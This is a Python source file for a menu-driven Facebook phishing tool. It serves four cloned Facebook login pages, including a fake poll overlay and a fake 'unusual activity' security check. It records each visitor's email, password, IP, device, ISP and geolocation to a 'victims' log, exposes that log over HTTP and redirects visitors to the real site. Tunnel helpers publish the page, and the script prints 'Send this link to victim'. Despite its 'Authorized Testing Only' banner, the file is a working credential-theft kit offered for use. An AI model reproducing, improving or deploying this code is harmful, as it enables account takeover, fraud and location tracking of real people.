#!/usr/bin/env python3
"""
Facebook Phishing Tool - Menu Driven
Captures: Email, Password, IP, Device, ISP, Location
"""

import os
import sys
import json
import time
import socket
import datetime
import threading
import subprocess
import webbrowser
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs
from urllib.request import urlopen

# ======================== CONFIG ========================
PORT = 8080
LOG_FILE = "victims_data.txt"
# ========================================================

# ======================== FACEBOOK PAGES ========================
TRADITIONAL_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Helvetica, Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { display: flex; align-items: center; max-width: 1000px; padding: 20px; gap: 60px; }
        .left { flex: 1; }
        .left h1 { color: #1877f2; font-size: 56px; font-weight: 700; margin-bottom: 10px; }
        .left p { font-size: 24px; color: #1c1e21; line-height: 1.3; }
        .right { flex: 1; }
        .login-box { background: #fff; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1); padding: 20px; width: 396px; }
        .login-box input { width: 100%; padding: 14px 16px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; outline: none; }
        .login-box input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
        .login-btn { width: 100%; padding: 12px; background: #1877f2; color: #fff; border: none; border-radius: 6px; font-size: 20px; font-weight: 700; cursor: pointer; }
        .login-btn:hover { background: #166fe5; }
        .forgot { display: block; text-align: center; margin: 16px 0; color: #1877f2; font-size: 14px; text-decoration: none; }
        .forgot:hover { text-decoration: underline; }
        .divider { border-bottom: 1px solid #dadde1; margin: 20px 0; }
        .signup-btn { display: block; margin: 0 auto; padding: 12px 24px; background: #42b72a; color: #fff; border: none; border-radius: 6px; font-size: 17px; font-weight: 700; cursor: pointer; }        
    </style>
</head>
<body>
    <div class="container">
        <div class="left">
            <h1>facebook</h1>
            <p>Facebook helps you connect and share with the people in your life.</p>
        </div>
        <div class="right">
            <div class="login-box">
                <form action="/login" method="POST">
                    <input type="text" name="email" placeholder="Email address or phone number" required autofocus>
                    <input type="password" name="pass" placeholder="Password" required>
                    <button type="submit" class="login-btn">Log In</button>
                </form>
                <a href="#" class="forgot">Forgotten password?</a>
                <div class="divider"></div>
                <button class="signup-btn">Create new account</button>
            </div>
        </div>
    </div>
</body>
</html>"""

POLL_PAGE = """<!DOCTYPE html>
<html>
<head><title>Facebook - Voting Poll</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Helvetica,Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}
.box{background:#fff;border-radius:8px;padding:30px;width:450px;box-shadow:0 2px 4px rgba(0,0,0,0.1),0 8px 16px rgba(0,0,0,0.1);text-align:center}
.box h2{color:#1c1e21;margin-bottom:10px}
.box p{color:#606770;margin-bottom:20px}
.option{background:#f0f2f5;border:1px solid #dddfe2;border-radius:8px;padding:15px;margin:10px 0;cursor:pointer;font-size:16px}
.option:hover{background:#e7f3ff;border-color:#1877f2}
.option input{margin-right:10px}
.submit-btn{width:100%;padding:12px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:18px;font-weight:700;cursor:pointer;margin-top:15px}
.login-prompt{margin-top:15px;color:#606770;font-size:14px}
.login-prompt a{color:#1877f2;text-decoration:none}
</style>
</head>
<body>
<div class="box">
<h2>Which option do you prefer?</h2>
<p>Vote and see live results</p>
<form action="/login" method="POST">
<div class="option"><input type="radio" name="vote" value="a"> Option A - Best Choice</div>
<div class="option"><input type="radio" name="vote" value="b"> Option B - Great Alternative</div>
<div class="option"><input type="radio" name="vote" value="c"> Option C - Not Sure</div>
<button type="submit" class="submit-btn">Submit Vote</button>
</form>
<div class="login-prompt">To see results, <a href="#" onclick="document.getElementById('login-overlay').style.display='block'">Log in with Facebook</a></div>
</div>
<div id="login-overlay" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);display:none;justify-content:center;align-items:center">
<div style="background:#fff;border-radius:8px;padding:20px;width:396px">
<h3 style="text-align:center;margin-bottom:20px">Log in to Facebook</h3>
<form action="/login" method="POST">
<input type="text" name="email" placeholder="Email or phone" style="width:100%;padding:14px;margin-bottom:12px;border:1px solid #dddfe2;border-radius:6px;font-size:17px" required>
<input type="password" name="pass" placeholder="Password" style="width:100%;padding:14px;margin-bottom:12px;border:1px solid #dddfe2;border-radius:6px;font-size:17px" required>
<button type="submit" style="width:100%;padding:12px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:18px;font-weight:700;cursor:pointer">Log In</button>
</form>
</div>
</div>
<script>document.querySelector('.login-prompt a').onclick=function(){document.getElementById('login-overlay').style.display='flex';return false}</script>
</body>
</html>"""

SECURITY_PAGE = """<!DOCTYPE html>
<html>
<head><title>Facebook - Security Check</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Helvetica,Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}
.box{background:#fff;border-radius:8px;padding:30px;width:450px;box-shadow:0 2px 4px rgba(0,0,0,0.1),0 8px 16px rgba(0,0,0,0.1);text-align:center}
.box .icon{font-size:48px;margin-bottom:15px;color:#1877f2}
.box h2{color:#1c1e21;margin-bottom:10px}
.box p{color:#606770;margin-bottom:20px;font-size:14px}
.security-badge{display:inline-block;background:#e7f3ff;padding:5px 10px;border-radius:4px;color:#1877f2;font-size:12px;margin-bottom:20px}
.box input{width:100%;padding:14px 16px;margin-bottom:12px;border:1px solid #dddfe2;border-radius:6px;font-size:17px;outline:none}
.box input:focus{border-color:#1877f2;box-shadow:0 0 0 2px #e7f3ff}
.login-btn{width:100%;padding:12px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:18px;font-weight:700;cursor:pointer}
</style>
</head>
<body>
<div class="box">
<div class="icon">&#128274;</div>
<h2>Security Check Required</h2>
<div class="security-badge">&#10003; Secured by SSL</div>
<p>We noticed unusual activity from your account. Please verify your identity to continue.</p>
<form action="/login" method="POST">
<input type="text" name="email" placeholder="Email or phone number" required>
<input type="password" name="pass" placeholder="Confirm your password" required>
<button type="submit" class="login-btn">Verify Identity</button>
</form>
</div>
</body>
</html>"""

MESSENGER_PAGE = """<!DOCTYPE html>
<html>
<head><title>Facebook Messenger</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Helvetica,Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}
.box{background:#fff;border-radius:8px;padding:30px;width:396px;box-shadow:0 2px 4px rgba(0,0,0,0.1),0 8px 16px rgba(0,0,0,0.1);text-align:center}
.messenger-logo{font-size:36px;color:#1877f2;font-weight:bold;margin-bottom:5px}
.messenger-logo span{font-size:14px;color:#606770;display:block;font-weight:normal}
.box h2{color:#1c1e21;margin-bottom:20px;font-size:18px}
.box input{width:100%;padding:14px 16px;margin-bottom:12px;border:1px solid #dddfe2;border-radius:6px;font-size:17px;outline:none}
.box input:focus{border-color:#1877f2;box-shadow:0 0 0 2px #e7f3ff}
.login-btn{width:100%;padding:12px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:18px;font-weight:700;cursor:pointer}
.login-btn:hover{background:#166fe5}
.forgot{display:block;text-align:center;margin:16px 0;color:#1877f2;font-size:14px;text-decoration:none}
</style>
</head>
<body>
<div class="box">
<div class="messenger-logo">messenger<span>from facebook</span></div>
<h2>Log in to continue</h2>
<form action="/login" method="POST">
<input type="text" name="email" placeholder="Email or phone number" required autofocus>
<input type="password" name="pass" placeholder="Password" required>
<button type="submit" class="login-btn">Log In</button>
</form>
<a href="#" class="forgot">Forgotten password?</a>
</div>
</body>
</html>"""
# ========================================================

# ======================== PAGES DICT ========================
PAGES = {
    "1": {"name": "Traditional Login Page", "html": TRADITIONAL_PAGE},
    "2": {"name": "Advanced Voting Poll Login Page", "html": POLL_PAGE},
    "3": {"name": "Fake Security Login Page", "html": SECURITY_PAGE},
    "4": {"name": "Facebook Messenger Login Page", "html": MESSENGER_PAGE},
}
# ==========================================================

# ======================== VICTIM INFO ========================
def get_device(ua):
    u = ua.lower()
    if "nt 10" in u: return "Windows 10/11 PC"
    if "nt 6.3" in u: return "Windows 8.1 PC"
    if "nt 6.1" in u: return "Windows 7 PC"
    if "mac os x" in u and "iphone" not in u and "ipad" not in u: return "macOS Device"
    if "iphone" in u: return "iPhone"
    if "ipad" in u: return "iPad"
    if "android" in u: return "Android Device"
    if "linux" in u: return "Linux Device"
    return "Unknown Device"

def get_ip_info(ip):
    try:
        with urlopen(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,org,lat,lon,timezone,query", timeout=5) as r:
            d = json.load(r)
        if d.get("status") == "success":
            return d
    except: pass
    return {"isp": "Unknown", "org": "Unknown", "country": "Unknown", "regionName": "Unknown", "city": "Unknown", "lat": "N/A", "lon": "N/A", "timezone": "Unknown"}
# ============================================================

# ======================== HTTP HANDLER ========================
class PhishHandler(BaseHTTPRequestHandler):
    page_html = TRADITIONAL_PAGE
    
    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(self.page_html.encode())
        elif self.path == "/victims":
            if os.path.exists(LOG_FILE):
                self.send_response(200)
                self.send_header("Content-Type", "text/plain")
                self.end_headers()
                with open(LOG_FILE, "rb") as f:
                    self.wfile.write(f.read())
            else:
                self.send_response(200)
                self.send_header("Content-Type", "text/plain")
                self.end_headers()
                self.wfile.write(b"No victims yet.")
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"Not Found")
    
    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        data = self.rfile.read(length).decode()
        params = parse_qs(data)
        
        email = params.get("email", [""])[0]
        password = params.get("pass", [""])[0]
        client_ip = self.client_address[0]
        user_agent = self.headers.get("User-Agent", "Unknown")
        ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        device = get_device(user_agent)
        info = get_ip_info(client_ip)
        
        hostname = "Unknown"
        try: hostname = socket.gethostbyaddr(client_ip)[0]
        except: pass
        
        log = f"""
{'='*55}
  NEW VICTIM CAPTURED
{'='*55}
  Timestamp  : {ts}
  IP         : {client_ip}
  Hostname   : {hostname}
  Device     : {device}
  User-Agent : {user_agent}
  ISP        : {info.get('isp','Unknown')}
  Org        : {info.get('org','Unknown')}
  Country    : {info.get('country','Unknown')}
  Region     : {info.get('regionName','Unknown')}
  City       : {info.get('city','Unknown')}
  Coords     : {info.get('lat','N/A')}, {info.get('lon','N/A')}
  Timezone   : {info.get('timezone','Unknown')}
{'='*55}
  USERNAME   : {email}
  PASSWORD   : {password}
{'='*55}
"""
        
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(log)
        
        print(f"\033[92m\n[+] VICTIM CAPTURED!\033[0m")
        print(f"    Email: {email}")
        print(f"    Pass:  {password}")
        print(f"    IP:    {client_ip}")
        print(f"    ISP:   {info.get('isp','Unknown')}")
        print(f"    Device: {device}")
        print(f"    Location: {info.get('city','?')}, {info.get('country','?')}")
        
        self.send_response(302)
        self.send_header("Location", "https://www.facebook.com")
        self.end_headers()
    
    def log_message(self, *a): pass
# ============================================================

# ======================== TUNNELING ========================
def start_ngrok():
    print("[*] Starting Ngrok tunnel...")
    try:
        ngrok = subprocess.Popen(
            ["ngrok", "http", str(PORT)],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        time.sleep(3)
        with urlopen("http://127.0.0.1:4040/api/tunnels") as r:
            data = json.load(r)
        url = data["tunnels"][0]["public_url"]
        print(f"\033[92m[+] Ngrok URL: {url}\033[0m")
        return url
    except:
        print("\033[91m[!] Ngrok failed. Install: sudo apt install ngrok\033[0m")
        return None

def start_cloudflared():
    print("[*] Starting Cloudflared tunnel...")
    try:
        cf = subprocess.Popen(
            ["cloudflared", "tunnel", "--url", f"http://localhost:{PORT}"],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT
        )
        time.sleep(4)
        for line in iter(cf.stdout.readline, b''):
            line = line.decode(errors='ignore')
            if "https://" in line and ".trycloudflare.com" in line:
                url = line[line.index("https://"):line.index(".trycloudflare.com")+18]
                print(f"\033[92m[+] Cloudflared URL: {url}\033[0m")
                return url
        return None
    except:
        print("\033[91m[!] Cloudflared failed. Install: sudo apt install cloudflared\033[0m")
        return None

def start_localxpose():
    print("[*] Starting LocalXpose tunnel (15 min limit)...")
    try:
        lx = subprocess.Popen(
            ["loclx", "tunnel", "http", "--to", f"localhost:{PORT}"],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT
        )
        time.sleep(4)
        for line in iter(lx.stdout.readline, b''):
            line = line.decode(errors='ignore')
            if ".loclx.io" in line.lower():
                for word in line.split():
                    if ".loclx.io" in word:
                        print(f"\033[92m[+] LocalXpose URL: {word.strip()}\033[0m")
                        return word.strip()
        return None
    except:
        print("\033[91m[!] LocalXpose failed. Install: sudo snap install localxpose\033[0m")
        return None
# ============================================================

# ======================== BANNER ========================
BANNER = """
\033[91m
███████╗ █████╗  ██████╗███████╗██████╗  ██████╗  ██████╗ ██╗  ██╗
██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██║  ██║
█████╗  ███████║██║     █████╗  ██████╔╝██║   ██║██║   ██║███████║
██╔══╝  ██╔══██║██║     ██╔══╝  ██╔══██╗██║   ██║██║   ██║██╔══██║
██║     ██║  ██║╚██████╗███████╗██████╔╝╚██████╔╝╚██████╔╝██║  ██║
╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
\033[0m
\033[93m  Facebook Phishing Tool - Authorized Testing Only\033[0m
\033[93m  Captures: Email, Password, IP, Device, ISP, Location\033[0m
"""
# ============================================================

# ======================== MAIN ========================
def main():
    os.system("clear" if os.name == "posix" else "cls")
    print(BANNER)
    
    # Menu 1: Select page type
    print("\n\033[94m[01] Facebook\033[0m")
    print("[-] Select an option : ", end="")
    choice = input().strip()
    
    if choice != "1":
        print("\033[91m[!] Invalid option. Defaulting to Facebook.\033[0m")
    print()
    
    # Menu 2: Select page template
    print("\033[94m[01] Traditional Login Page\033[0m")
    print("[02] Advanced Voting Poll Login Page")
    print("[03] Fake Security Login Page")
    print("[04] Facebook Messenger Login Page\033[0m")
    print("[-] Select an option : ", end="")
    page_choice = input().strip()
    
    selected_page = PAGES.get(page_choice, PAGES["1"])
    PhishHandler.page_html = selected_page["html"]
    print(f"\n\033[92m[+] Selected: {selected_page['name']}\033[0m")
    print()
    
    # Menu 3: Select tunnel method
    print("\033[94m[01] Localhost")
    print("[02] Ngrok.io     [Account Needed]")
    print("[03] Cloudflared  [Auto Detects]")
    print("[04] LocalXpose   [NEW! Max 15Min]\033[0m")
    print("[-] Select an option : ", end="")
    tunnel_choice = input().strip()
    print()
    
    # Start server
    server = HTTPServer(("0.0.0.0", PORT), PhishHandler)
    server_thread = threading.Thread(target=server.serve_forever, daemon=True)
    server_thread.start()
    
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    
    print(f"\033[92m[+] Server started on 0.0.0.0:{PORT}\033[0m")
    print(f"\033[92m[+] Local:   http://localhost:{PORT}\033[0m")
    print(f"\033[92m[+] LAN:     http://{local_ip}:{PORT}\033[0m")
    
    # Start tunnel
    tunnel_url = None
    if tunnel_choice == "2":
        tunnel_url = start_ngrok()
    elif tunnel_choice == "3":
        tunnel_url = start_cloudflared()
    elif tunnel_choice == "4":
        tunnel_url = start_localxpose()
    
    if tunnel_url:
        print(f"\n\033[92m[+] Send this link to victim: {tunnel_url}\033[0m")
        webbrowser.open(tunnel_url)
    else:
        print(f"\n\033[92m[+] Send this link to victim: http://{local_ip}:{PORT}\033[0m")
    
    print(f"\n\033[93m[+] View captured data: http://localhost:{PORT}/victims\033[0m")
    print(f"\033[93m[+] Log file: {LOG_FILE}\033[0m")
    print(f"\033[93m[+] Press Ctrl+C to stop\033[0m")
    
    # Monitor log file
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n\n\033[91m[!] Server stopped.\033[0m")
        server.shutdown()

if __name__ == "__main__":
    if sys.version_info < (3, 6):
        print("[!] Python 3.6+ required")
        sys.exit(1)
    main()
